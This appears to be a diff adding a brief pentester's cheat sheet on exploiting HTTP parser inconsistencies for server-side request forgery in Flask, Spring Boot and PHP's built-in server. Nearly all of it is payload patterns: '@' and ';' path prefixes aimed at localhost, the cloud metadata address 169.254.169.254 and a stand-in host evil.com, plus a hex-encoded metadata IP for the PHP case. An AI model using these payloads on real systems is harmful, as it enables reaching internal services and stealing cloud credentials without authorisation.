@@ -1,0 +1,17 @@
+https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies
+
+
+Python FLASK
+ADD @ before Path + SSRF Domain e.g. localhost;169.254.169.254
+
+
+SPRINGBOOT
+Add ; before Path +SSRF Domain e.g. ;@evil.com/url
+
+
+
+PHP Built-in Web Server
+1.Only works on the root Path /
+2. Dots . are not allowd --> hexencode IP ip_encoder https://gist.github.com/mhmdiaa/2587e2330b87db99c81ace2a190e235f
+e.g.
+*@0xa9fea9fe/
